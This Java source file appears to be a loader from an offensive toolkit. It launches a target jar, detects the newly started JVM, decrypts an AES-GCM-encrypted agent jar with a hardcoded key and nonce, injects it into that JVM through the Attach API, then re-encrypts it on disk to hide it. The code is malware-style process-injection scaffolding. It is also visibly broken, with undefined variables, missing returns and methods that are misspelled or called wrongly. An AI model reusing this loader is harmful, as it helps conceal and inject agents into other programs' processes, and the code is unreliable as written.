package com.nocebo.nLoader;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.spec.AlgorithmParameterSpec;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.nio.file.Files;
import java.nio.file.Path;
import java.io.File;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

public class Main {
    //replaceable
    static public String jarPath = "";
    static public String agentPath = "";
    static public String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";
    static public String agentNonce = "H8m=6#v?";

    public static void main(String[] args)
    {
        //passthrough to execute target jar
        passThroughJar(args);

        Hashtable beforeList = getActiveVM();
        //start stub
        int jvmStubRes = initJVMStub(jarPath);

        if (jvmStubRes != 0)
        {
            System.exit();
        }

        Hashtable afterList = getActiveVM();

        VirtualMachineDescriptor targetVM = getTargetVM(beforeList, afterList);
        //decrypt agentJar
        decryptJVMAgent();
        attachJVMStub(targetVM);
        encryptJVMAgent();
    }

    public static void passThroughJar(String[] initArgs)
    {
        //process args, runtime exec
        String jarPath = getCLass().getProtectionDomain().getCodeSource().getLocation().toUri().getPath();
        String[] cmdArgs = new String[] {"java.exe","-jar",jarPath};
        String[] cmdArrayData = Stream.concat(Arrays.stream(cmdArgs),Arrays.Stream(initArgs)).toArray(String[]::new);

        try
        {
            Runtime.getRuntime().exec(cmdArrayData);
        }
        catch (Exception r)
        {
            //idgaf, probably
        }
    }

    public static int initJVMStub(String jarStubPath)
    {
        //runtimeexec
        //suboptimal, but oh well
        try
        {
            Runtime.getRuntime().exec(new String[] {"java.exe","-jar",jarStubPath});
        }
        catch (Exception r)
        {
            return 1;
        }
        return 0;
    }

    public static void decryptJVMAgent()
    {
        byte[] agentBytes = Files.readAllBytes(Path.get(agentPath));
        byte[] decryptedAgent = decrypt(agentBytes,agentKey.getBytes(),agentNonce.getBytes());
        Files.write(agentPath, decryptedAgent);
    }

    public static void encryptJVMAgent()
    {
        byte[] agentBytes = Files.readAllBytes(Path.get(agentPath));
        byte[] encryptedAgent = encrypt(agentBytes,agentKey.getBytes(),agentNonce.getBytes());
        Files.write(agentPath, encryptedAgent);
    }

    public static int attachJVMStub(VirtualMachineDescriptor targetVM)
    {
        VirtualMachine vm = VirtualMachine.attach(targetVM);

        try 
        {
            vm.loadAgent(agentJarPath, options);
        } 
        catch (Exception e)
        {
            System.exit();
        }
        finally 
        {
            vm.detach();
        }
    }

    public static Hashtable getActiveVM()
    {
        Hashtable vmList = new Hashtable();
        ArrayList activeVM = new ArrayList(VirtualMachine.list());
        for (int v=0;v<activeVM.size();v++)
        {
            VirtualMachineDescriptor vmObj = (VirtualMachineDescriptor) activeVM.get(v);
            vmList.put(vmObj.id(),vmObj);
        }
        return vmList;
    }

    public static VirtualMachineDescriptor getTargetVM(Hashtable vmListBefore, Hashtable vmListAfter)
    {
        Enumeration<String> i = vmListAfter.keys();

        while (i.hasMoreElements())
        {
            String vmKey = i.nextElement();
            if (!vmListBefore.containsKey(vmKey))
            {
                return (VirtualMachineDescriptor) vmListAfter.get(vmKey);
            }
        }
        System.exit();
    }

    //replicates my lycanthropy aesgcm
    public static byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        SecretKey key = initKey(keyData);
        Cipher cipher = initCipher();

        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
        cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
        return cipher.doFinal(plaintext);
    }

    public static byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        SecretKey key = initKey(keyData);
        Cipher cipher = initCipher();

        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
        cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
        return cipher.doFinal(encrypted);
    }

    private static Cipher initCipher() throws Exception
    {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        return cipher;
    }

    private static SecretKey initKey(byte[] keyBytes) throws Exception
    {
        SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
        return key;
    }            
}
